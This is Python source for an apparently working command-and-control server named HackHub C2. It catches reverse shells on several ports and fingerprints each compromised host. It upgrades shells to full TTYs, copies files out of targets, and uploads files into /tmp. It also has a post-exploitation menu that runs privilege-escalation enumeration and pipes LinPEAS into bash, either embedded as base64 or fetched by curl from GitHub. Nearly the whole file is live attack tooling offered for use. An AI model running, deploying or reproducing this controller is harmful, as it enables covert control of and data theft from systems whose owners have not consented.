import asyncio
import os
import sys
import tty
import termios
import base64
import hashlib
import re
import uuid
import argparse
from datetime import datetime

# ANSI Rəng Palitrası
CLR_G = "\033[32m"
CLR_R = "\033[31m"
CLR_Y = "\033[33m"
CLR_C = "\033[36m"
CLR_M = "\033[35m"
CLR_W = "\033[37m"
CLR_0 = "\033[0m"

MAX_LOG_SIZE = 102400  # 100 KB Ring-Buffer Limiti

class CircularBuffer:
    def __init__(self, capacity):
        self.capacity = capacity
        self.buffer = bytearray(capacity)
        self.head = 0
        self.tail = 0
        self.size = 0
        self.lock = asyncio.Lock()

    async def write(self, data: bytes):
        async with self.lock:
            for b in data:
                self.buffer[self.tail] = b
                self.tail = (self.tail + 1) % self.capacity
                if self.size < self.capacity:
                    self.size += 1
                else:
                    self.head = (self.head + 1) % self.capacity

    async def read_all(self) -> bytes:
        async with self.lock:
            out = bytearray(self.size)
            h = self.head
            for i in range(self.size):
                out[i] = self.buffer[h]
                h = (h + 1) % self.capacity
            return bytes(out)


class Session:
    def __init__(self, session_id, reader, writer, listen_port):
        self.id = session_id
        self.name = session_id  
        self.tag = "N/A"
        self.reader = reader
        self.writer = writer
        self.remote_addr = writer.get_extra_info('peername')[0]
        self.port = writer.get_extra_info('peername')[1]
        self.listen_port = listen_port
        self.os = "Generic Shell"
        self.kernel = "Unknown"
        self.hostname = "Unknown"
        self.alert = False
        self.active = True
        self.ring_buffer = CircularBuffer(MAX_LOG_SIZE)
        self.notes = []
        self.lock = asyncio.Lock()


class HackHubC2:
    def __init__(self, ports):
        self.ports = ports
        self.sessions = {}
        self.active_session_id = None
        self.is_menu_open = False
        self.old_settings = None
        self.start_time = datetime.now()
        self.notify_menu_refresh = asyncio.Queue()
        self.raw_stdin_chan = asyncio.Queue()
        self.menu_input_chan = asyncio.Queue()
        self.lock = asyncio.Lock()
        
        # In-Memory Baseline Payload
        self.enum_baseline = "\necho '=== SUDO ==='; sudo -l 2>/dev/null; echo '=== SUID ==='; find / -perm -4000 -type f 2>/dev/null; echo '=== CRON ==='; cat /etc/crontab 2>/dev/null\n"
        self.linpeas_embedded = "#!/bin/bash\necho '=== HackHub Embedded LinPEAS Asset ==='\nid; uname -a; localectl 2>/dev/null\n"
        
        if not os.path.exists("logs"):
            os.makedirs("logs")

    def sanitize_file_name(self, input_str: str) -> str:
        clean = re.sub(r'[^a-zA-Z0-9._-]', '', input_str)
        if ".." in clean or clean in [".", ""]:
            return ""
        return clean

    def log_session_event(self, s_id, event_type, message):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_line = f"[{timestamp}] [{event_type.upper()}] {message}\n"
            with open(f"logs/session_{s_id}.log", "a", encoding="utf-8") as f:
                f.write(log_line)
        except Exception:
            pass

    async def safe_write(self, session: Session, data: bytes):
        async with session.lock:
            if not session.active:
                return
            try:
                session.writer.write(data)
                await session.writer.drain()
            except Exception:
                await self.terminate_session(session.id)

    async def start_listeners(self):
        tasks = []
        for port in self.ports:
            try:
                server = await asyncio.start_server(
                    lambda r, w, p=port: self.handle_inbound(r, w, p), 
                    '0.0.0.0', port
                )
                print(f"{CLR_G}[+] Port Listener deployed successfully on 0.0.0.0:{port}{CLR_0}\r")
                tasks.append(server.serve_forever())
            except Exception as e:
                print(f"{CLR_R}[-] Failed to bind listener on port {port}: {e}{CLR_0}\r")
        
        if tasks:
            await asyncio.gather(*tasks)

    async def handle_inbound(self, reader, writer, listen_port):
        s_id = str(uuid.uuid4())[:6]
        session = Session(s_id, reader, writer, listen_port)
        
        async with self.lock:
            self.sessions[s_id] = session
            if self.active_session_id is None:
                self.active_session_id = s_id

        self.log_session_event(s_id, "connect", f"Inbound connection from {session.remote_addr}:{session.port} on listener port {listen_port}")

        try:
            # 🚀 Ciddi şəkildə izolyasiya olunmuş marker sistemi göndərilir
            writer.write(b"\necho '===START_METADATA==='; uname -s; uname -r; hostname; echo '===END_METADATA==='\n")
            await writer.drain()
            
            raw_data = b""
            # Bütün metadata blokunu soket daxilindən tamamilə təmizlənənə qədər buraxmırıq
            while b"===END_METADATA===" not in raw_data:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                if not chunk:
                    break
                raw_data += chunk
                if len(raw_data) > 20000:
                    break
            
            # TTY Yüksəldilməsi və Echo Söndürmə əmrləri birbaşa handshake tünelində icra edilir
            writer.write(b"stty -echo 2>/dev/null || true\n")
            writer.write(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || script /dev/null -c bash || perl -e 'exec \"/bin/bash\";' || sh\n")
            writer.write(b"\n")
            await writer.drain()

            # 🛠️ CRITICAL FIX: stty və pty.spawn əmrlərinin qusduğu bütün törəmə byte-lar strictly oxunub məhv edilir
            await asyncio.sleep(0.4)
            try:
                extra_clean = await asyncio.wait_for(reader.read(4096), timeout=0.4)
                raw_data += extra_clean
            except asyncio.TimeoutError:
                pass

            handshake_str = raw_data.decode('utf-8', errors='ignore')
            
            # Shell Prompt və kənar sızmaları rədd edən Regex-Isolated Parser
            if "===START_METADATA===" in handshake_str:
                core_block = handshake_str.split("===START_METADATA===")[1].split("===END_METADATA===")[0]
                raw_lines = core_block.strip().split("\n")
                
                metadata = []
                for line in raw_lines:
                    line_clean = line.strip()
                    # 🎯 Anti-Prompt Filter: Heç bir qırıq shell sətiri metadata kimi qəbul edilə bilməz!
                    if not line_clean:
                        continue
                    if any(x in line_clean for x in ["┌──", "└─", "$", "#", "uname", "hostname", "echo", "stty", "pty.spawn"]):
                        continue
                    metadata.append(line_clean)

                if len(metadata) >= 3:
                    session.os = metadata[0]
                    session.kernel = metadata[1]
                    session.hostname = metadata[2]
                    if any(v in session.kernel for v in ["5.10.", "5.15.", "4.19.", "6."]):
                        session.alert = True

        except Exception:
            await self.terminate_session(s_id)
            return

        self.log_session_event(s_id, "metadata", f"OS: {session.os} | Kernel: {session.kernel} | Hostname: {session.hostname}")

        async with self.lock:
            is_menu = self.is_menu_open

        # 🎯 Tamamilə təmizlənmiş, heç bir kənar sızıntısı olmayan vahid sənaye çıxışı (Banner)
        if not is_menu:
            print(f"\r\n{CLR_G}[+] TARGET INTEGRATED INTO CORE MATRIX:{CLR_0}\r")
            print(f"{CLR_C}----------------------------------------------------{CLR_0}\r")
            print(f"{CLR_W} Session Name  : {session.name}{CLR_0}\r")
            print(f"{CLR_W} Listener Port : {session.listen_port}{CLR_0}\r")
            print(f"{CLR_W} Remote Addr   : {session.remote_addr}:{session.port}{CLR_0}\r")
            print(f"{CLR_W} Platform Info : {session.os} ({session.kernel}){CLR_0}\r")
            print(f"{CLR_W} Hostname      : {session.hostname}{CLR_0}\r")
            print(f"{CLR_C}----------------------------------------------------{CLR_0}\r")
            sys.stdout.flush()

        await self.notify_menu_refresh.put(True)
        # 🚀 read_traffic döngüsü YALNIZ və YALNIZ yuxarıdakı bütün şəbəkə təmizliyi bitdikdən sonra başladılır!
        asyncio.create_task(self.read_traffic(session))

    async def read_traffic(self, session: Session):
        while True:
            try:
                data = await session.reader.read(4096)
                if not data:
                    await self.terminate_session(session.id)
                    break
                
                await session.ring_buffer.write(data)
                
                clean_str = data.decode('utf-8', errors='ignore')
                if clean_str.strip():
                    self.log_session_event(session.id, "traffic", clean_str.strip())

                async with self.lock:
                    is_menu = self.is_menu_open
                    is_active = (self.active_session_id == session.id)

                if is_active and not is_menu:
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()
            except Exception:
                await self.terminate_session(session.id)
                break

    async def terminate_session(self, s_id):
        async with self.lock:
            if s_id in self.sessions:
                session = self.sessions[s_id]
                async with session.lock:
                    session.active = False
                    try:
                        session.writer.close()
                    except Exception:
                        pass
                self.log_session_event(s_id, "disconnect", "Session connection terminated cleanly.")
                del self.sessions[s_id]
                
                if self.active_session_id == s_id:
                    self.active_session_id = None
                    for next_id in self.sessions:
                        if self.sessions[next_id].active:
                            self.active_session_id = next_id
                            break
                
                is_menu = self.is_menu_open
                curr_active = self.active_session_id

        await self.notify_menu_refresh.put(True)
        if not is_menu:
            print(f"\r\n{CLR_R}[-] DISCONNECTED: Session #{s_id} dropped.{CLR_0}\r")
            if curr_active is not None:
                print(f"{CLR_Y}[*] Auto-failover active. Switched routing to Session #{curr_active}{CLR_0}\r")
            sys.stdout.flush()

    async def input_dispatcher(self):
        loop = asyncio.get_running_loop()
        buf = bytearray(1)  
        while True:
            try:
                n = await loop.run_in_executor(None, sys.stdin.buffer.readinto, buf)
                if n == 0:
                    await asyncio.sleep(0.01)
                    continue
                await self.raw_stdin_chan.put(buf[0])
            except Exception:
                return

    async def input_line_builder(self):
        var_line = []
        while True:
            b = await self.raw_stdin_chan.get()
            async with self.lock:
                is_open = self.is_menu_open

            if not is_open:
                await self.menu_input_chan.put(f"RAW:{b}")
                continue

            if b in [13, 10]:  # Deterministik Tək Enter idarəetmə xətti
                fmt_str = "".join(var_line)
                var_line.clear()
                print("\r\n", end="")
                sys.stdout.flush()
                await self.menu_input_chan.put(f"STR:{fmt_str}")
                continue
            elif b == 27:  # ESC
                await self.menu_input_chan.put("CMD:ESC")
                var_line.clear()
                continue
            elif b == 3:  # Ctrl+C
                await self.menu_input_chan.put("CMD:CTRLC")
                var_line.clear()
                continue
            elif b in [127, 8]:  # Backspace
                if var_line:
                    var_line.pop()
                    print("\b \b", end="")
                    sys.stdout.flush()
            elif 32 <= b <= 126:
                char = chr(b)
                var_line.append(char)
                print(char, end="")
                sys.stdout.flush()

    async def input_multiplexer(self):
        self.old_settings = termios.tcgetattr(sys.stdin)
        tty.setraw(sys.stdin.fileno())
        
        cmd_buf = ""
        
        try:
            while True:
                token = await self.menu_input_chan.get()
                async with self.lock:
                    is_open = self.is_menu_open
                    s_id = self.active_session_id

                if token.startswith("CMD:"):
                    cmd = token.split(":", 1)[1]
                    if is_open:
                        if cmd in ["ESC", "CTRLC"]:
                            async with self.lock:
                                self.is_menu_open = False
                            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_settings)
                            print("\r\n[*] Context matrix returned to terminal shell interaction line.\r")
                            sys.stdout.flush()
                            tty.setraw(sys.stdin.fileno())
                        continue

                if token.startswith("RAW:"):
                    b = int(token.split(":", 1)[1])
                    if b == 1:  # Ctrl+A
                        async with self.lock:
                            self.is_menu_open = True
                        asyncio.create_task(self.display_dashboard_menu())
                        continue
                    
                    if s_id is not None:
                        async with self.lock:
                            session = self.sessions.get(s_id)
                        if session and session.active:
                            if b in [10, 13]:
                                cmd_str = cmd_buf.strip()
                                if cmd_str == ":sessions":
                                    await self.inline_display_sessions()
                                    cmd_buf = ""
                                    continue
                                elif cmd_str.startswith(":switch "):
                                    target = cmd_str.replace(":switch ", "", 1).strip()
                                    await self.inline_switch_session(target)
                                    cmd_buf = ""
                                    continue
                                elif cmd_str.startswith(":addnote "):
                                    note_text = cmd_str.replace(":addnote ", "", 1).strip()
                                    session.notes.append(note_text)
                                    self.log_session_event(session.id, "note", f"Added local structural note: {note_text}")
                                    print(f"\r\n{CLR_G}[+] Note registered directly under current context.{CLR_0}\r")
                                    cmd_buf = ""
                                    continue
                                elif cmd_str == ":notes":
                                    print(f"\r\n{CLR_C}=== NOTES FOR SESSION: {session.name} ==={CLR_0}\r")
                                    for idx, val in enumerate(session.notes):
                                        print(f"[{idx+1}] {val}\r")
                                    cmd_buf = ""
                                    continue
                                elif cmd_str in ["bye", "exit"]:
                                    self.shutdown()
                                    return
                                if cmd_str.startswith("get "):
                                    file = self.sanitize_file_name(cmd_str.replace("get ", "", 1).strip())
                                    if file:
                                        await self.safe_write(session, f"\necho 'START'; cat %s 2>/dev/null | base64; echo 'END'\n" % file.encode())
                                    cmd_buf = ""
                                    continue
                                if cmd_str.startswith("put "):
                                    file = self.sanitize_file_name(cmd_str.replace("put ", "", 1).strip())
                                    asyncio.create_task(self.stream_upload(session, file))
                                    cmd_buf = ""
                                    continue
                                cmd_buf = ""
                            elif 32 <= b <= 126:
                                cmd_buf += chr(b)
                            
                            await self.safe_write(session, bytes([b]))
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_settings)

    async def inline_display_sessions(self):
        async with self.lock:
            session_list = list(self.sessions.values())
        print(f"\r\n{CLR_C}=== INLINE ROUTING SESSION TABLE ==={CLR_0}\r")
        for s in session_list:
            print(f" -> Name: {s.name} | ID: {s.id} | Host: {s.remote_addr} | OS: {s.os}\r")
        print("\r")
        sys.stdout.flush()

    async def inline_switch_session(self, target):
        async with self.lock:
            for s_id, s in self.sessions.items():
                if s.name == target or s.id == target:
                    self.active_session_id = s_id
                    print(f"\r\n{CLR_G}[+] Switched active routing pipeline to: {s.name}{CLR_0}\r\n")
                    sys.stdout.flush()
                    return
        print(f"\r\n{CLR_R}[-] Targeted Session ID or custom tag name not found.{CLR_0}\r\n")
        sys.stdout.flush()

    async def display_dashboard_menu(self):
        while True:
            async with self.lock:
                is_open = self.is_menu_open
                session_list = list(self.sessions.values())
                curr_active = self.active_session_id
            if not is_open:
                return

            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_settings)
            print("\033[H\033[2J\033[0m", end="")
            
            uptime = str(datetime.now() - self.start_time).split('.')[0]
            linux_count = sum(1 for s in session_list if "linux" in s.os.lower())
            win_count = sum(1 for s in session_list if "win" in s.os.lower() or "cmd" in s.os.lower())
            hosts_connected = len(set(s.remote_addr for s in session_list))
            session = self.sessions.get(curr_active) if curr_active else None

            print(f"{CLR_M}+----------------------------------------------------+{CLR_0}")
            print(f"{CLR_M}|            HACKHUB ADVANCED CORE CONTROL DASHBOARD |{CLR_0}")
            print(f"{CLR_M}+----------------------------------------------------+{CLR_0}")
            print(f"| Framework Uptime   : {uptime:<29} |")
            print(f"| Listener Ports     : {str(self.ports):<29} |")
            print(f"| Connected Hosts    : {hosts_connected:<29} |")
            print(f"| Linux Sessions     : {CLR_G}{linux_count:<29}{CLR_0} |")
            print(f"| Windows Sessions   : {CLR_C}{win_count:<29}{CLR_0} |")
            print(f"| Total Active Pipes : {len(session_list):<29} |")
            print(f"{CLR_M}+----------------------------------------------------+{CLR_0}")
            if session:
                print(f"{CLR_G}| INTERACTIVE SESSION: #{session.name:<10} | OS: {session.os:<10} |{CLR_0}")
            else:
                print(f"{CLR_R}| INTERACTIVE SESSION: NONE                           |{CLR_0}")
            print(f"{CLR_M}+----------------------------------------------------+{CLR_0}")
            print(f"{CLR_C}| [1] Session Advanced Management Engine             |{CLR_0}")
            print(f"{CLR_C}| [2] Isolated Session Notes Archive Ledger         |{CLR_0}")
            print(f"{CLR_C}| [3] Post-Exploitation Injection Automator          |{CLR_0}")
            print(f"{CLR_C}| [4] Telemetry & Transaction Log Viewer             |{CLR_0}")
            print(f"{CLR_R}| [ESC/Ctrl+C] Dismiss Dashboard & Resume Operations |{CLR_0}")
            print(f"{CLR_M}+----------------------------------------------------+{CLR_0}")
            print(f"{CLR_Y}[>] Core Vector Directive: {CLR_0}", end="")
            sys.stdout.flush()
            
            tty.setraw(sys.stdin.fileno())
            
            choice_token = await self.menu_input_chan.get()
            if choice_token.startswith("CMD:"):
                cmd = choice_token.split(":", 1)[1]
                if cmd in ["ESC", "CTRLC"]:
                    async with self.lock:
                        self.is_menu_open = False
                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_settings)
                    print("\r\n[*] Core Panel closed. Session resumed.\r")
                    sys.stdout.flush()
                    tty.setraw(sys.stdin.fileno())
                    return

            if choice_token.startswith("STR:"):
                ch = choice_token.split(":", 1)[1].strip().lower()
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_settings)
                if ch == '1':
                    await self.run_session_manager_ui()
                elif ch == '2':
                    await self.run_notes_manager_ui()
                elif ch == '3':
                    await self.run_privesc_ui()
                elif ch == '4':
                    await self.run_log_viewer_ui()
                elif ch == 'q':
                    break

    async def run_session_manager_ui(self):
        async with self.lock:
            session_list = list(self.sessions.values())
        print("\033[H\033[2J=== ADVANCED SESSION MANAGEMENT ENGINE ===\n")
        print(f"{'Name/Tag':<15} {'ID':<8} {'Remote Endpoint':<22} {'Platform':<15} {'Port':<6}")
        print("-" * 70)
        for s in session_list:
            print(f"{s.name:<15} {s.id:<8} {s.remote_addr+':'+str(s.port):<22} {s.os:<15} {s.listen_port:<6}")
        
        print("\nCommands: [list, switch <name>, rename <id> <new_name>, tag <id> <tag>, filter <keyword>, back]")
        choice = input("[>] Manager Directive: ").strip()
        if choice == "back" or choice == "":
            return
        
        if choice.startswith("switch "):
            target = choice.replace("switch ", "", 1).strip()
            await self.inline_switch_session(target)
        elif choice.startswith("rename "):
            parts = choice.split(" ")
            if len(parts) >= 3:
                s_id, new_name = parts[1], parts[2]
                async with self.lock:
                    if s_id in self.sessions:
                        self.sessions[s_id].name = new_name
                print(f"[+] Session custom tag mapping altered to: {new_name}")
        elif choice.startswith("tag "):
            parts = choice.split(" ")
            if len(parts) >= 3:
                s_id, new_tag = parts[1], parts[2]
                async with self.lock:
                    if s_id in self.sessions:
                        self.sessions[s_id].tag = new_tag
        elif choice.startswith("filter "):
            kw = choice.replace("filter ", "", 1).strip().lower()
            print(f"\n--- FILTERED MATRIX OUTPUT MATCHING: '{kw}' ---")
            async with self.lock:
                for s in self.sessions.values():
                    if kw in s.name.lower() or kw in s.os.lower() or kw in s.id.lower():
                        print(f" -> {s.name} (#{s.id}) - {s.remote_addr} [{s.os}]")
            input("\nPress Enter to return...")

    async def run_notes_manager_ui(self):
        async with self.lock:
            session_list = list(self.sessions.values())
        print("\033[H\033[2J=== ISOLATED SESSION NOTES LEDGER ARCHIVE ===\n")
        for s in session_list:
            print(f"[@] Session Context: {s.name} (#{s.id})")
            if not s.notes:
                print("    (No historical intelligence metadata recorded)")
            for n in s.notes:
                print(f"    -> {n}")
        
        s_target = input("\nEnter Target Session ID/Name to append note (or 'back'): ").strip()
        if s_target != "back" and s_target != "":
            async with self.lock:
                for s in self.sessions.values():
                    if s.name == s_target or s.id == s_target:
                        note_input = input("Enter intelligence cleartext string: ").strip()
                        if note_input:
                            s.notes.append(note_input)
                            self.log_session_event(s.id, "note", f"Added structural ledger telemetry note: {note_input}")

    async def run_privesc_ui(self):
        async with self.lock:
            curr_active = self.active_session_id
            session = self.sessions.get(curr_active) if curr_active else None
        if not session:
            print("[-] Error: Active transmission line required for injection vectors.")
            input("Press Enter...")
            return
            
        print("\033[H\033[2J=== POST-EXPL_OT MATRIX ENHANCEMENT ENGINE ===\n")
        print("[1] Run Core Enumeration Shell Baseline Vector")
        print("[2] Ingest Real LinPEAS Payload from Local Workspace")
        print("[3] Live Automated GitHub Ingestion Vector")
        opt = input("\n[>] Task Token Directive: ").strip()
        if opt == '1':
            await self.safe_write(session, self.enum_baseline.encode())
            async with self.lock:
                self.is_menu_open = False
        elif opt == '2':
            if os.path.exists("linpeas.sh"):
                with open("linpeas.sh", "r", errors="ignore") as f:
                    peas_content = f.read()
                b64 = base64.b64encode(peas_content.encode()).decode()
                await self.safe_write(session, f"\necho '{b64}' | base64 -d | bash\n".encode())
                async with self.lock:
                    self.is_menu_open = False
            else:
                print("[-] Error: Local linpeas.sh frame asset file not found.")
                input("Press Enter...")
        elif opt == '3':
            github_url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
            await self.safe_write(session, f"\ncurl -sL {github_url} | bash\n".encode())
            async with self.lock:
                self.is_menu_open = False

    async def run_log_viewer_ui(self):
        print("\033[H\033[2J=== TELEMETRY LOG VIEWER SUB-SYSTEM ===\n")
        print("Available log channels in directory:")
        log_files = [f for f in os.listdir("logs") if f.endswith(".log")]
        if not log_files:
            print(" (No file transaction logs active on disk)")
            input("\nPress Enter...")
            return

        for f in log_files:
            print(f" -> {f}")
            
        target_log = input("\nEnter Log File Name to query (or 'back'): ").strip()
        if target_log == "back" or target_log == "":
            return
            
        if os.path.exists(f"logs/{target_log}"):
            kw = input("Enter keyword filter match (Leave blank for full stream dump): ").strip().lower()
            print(f"\n--- LOG RECORD DUMP FOR SOURCE: logs/{target_log} ---")
            with open(f"logs/{target_log}", "r", encoding="utf-8") as f:
                for line in f:
                    if kw == "" or kw in line.lower():
                        print(line.strip())
            input("\nLog transaction sequence query complete. Press Enter...")

    async def stream_upload(self, session: Session, file: str):
        sanitized = self.sanitize_file_name(file)
        if not sanitized or not os.path.exists(sanitized):
            return
            
        self.log_session_event(session.id, "upload", f"Initiated high-speed file delivery sequence: {sanitized}")
        hasher = hashlib.md5()
        await self.safe_write(session, f"\ncat << 'EOF' > /tmp/.b64\n".encode())
        
        with open(sanitized, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                hasher.update(chunk)
                b64_chunk = base64.b64encode(chunk).decode()
                await self.safe_write(session, f"{b64_chunk}\n".encode())
                
        local_md5 = hasher.hexdigest()
        await self.safe_write(session, f"EOF\nbase64 -d /tmp/.b64 > /tmp/{sanitized} && rm /tmp/.b64\n".encode())
        await self.safe_write(session, f"\necho '===INTEGRITY_CHECK==='; md5sum /tmp/{sanitized} 2>/dev/null; echo '===INTEGRITY_END==='\n".encode())
        
        timeout = 5.0
        start_time = asyncio.get_event_loop().time()
        while asyncio.get_event_loop().time() - start_time < timeout:
            await asyncio.sleep(0.1)
            log_bytes = await session.ring_buffer.read_all()
            log_str = log_bytes.decode('utf-8', errors='ignore')
            if "===INTEGRITY_CHECK===" in log_str and "===INTEGRITY_END===" in log_str:
                try:
                    extracted_block = log_str.split("===INTEGRITY_CHECK===")[1].split("===INTEGRITY_END===")[0]
                    if local_md5.lower() in extracted_block.lower():
                        self.log_session_event(session.id, "upload_success", f"File integrity confirmed match for {sanitized} via MD5 {local_md5}")
                    else:
                        self.log_session_event(session.id, "upload_fail", f"CRITICAL INTEGRITY CORRUPTION ON PATH TRANSMISSION: {sanitized}")
                except Exception:
                    pass
                break

    def shutdown(self):
        if self.old_settings:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_settings)
        sys.exit(0)


def main():
    parser = argparse.ArgumentParser(
        description=f"{CLR_C}HackHub C2 Server Framework Command Center (v11.5 Stable Core){CLR_0}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"{CLR_Y}Example Operations:\n  hackhub -p 4444\n  hackhub --port 1234,4444,8080{CLR_0}"
    )

    parser.add_argument(
        "-p",
        "--port",
        type=str,
        default="1234",
        help="Multi-Port routing target matrices array"
    )

    parser.add_argument(
        "-v",
        "--version",
        action="version",
        version="HackHub Advanced Framework Engine Core v11.5"
    )

    args = parser.parse_args()

    raw_ports = args.port.split(",")
    ports_array = []

    for port_str in raw_ports:
        cleaned = port_str.strip()
        if cleaned.isdigit():
            ports_array.append(int(cleaned))

    if not ports_array:
        ports_array = [1234]

    c2 = HackHubC2(ports_array)

    async def main_loop():
        await asyncio.gather(
            c2.start_listeners(),
            c2.input_dispatcher(),
            c2.input_line_builder(),
            c2.input_multiplexer()
        )

    try:
        asyncio.run(main_loop())
    except (KeyboardInterrupt, SystemExit):
        c2.shutdown()

if __name__ == "__main__":
    main()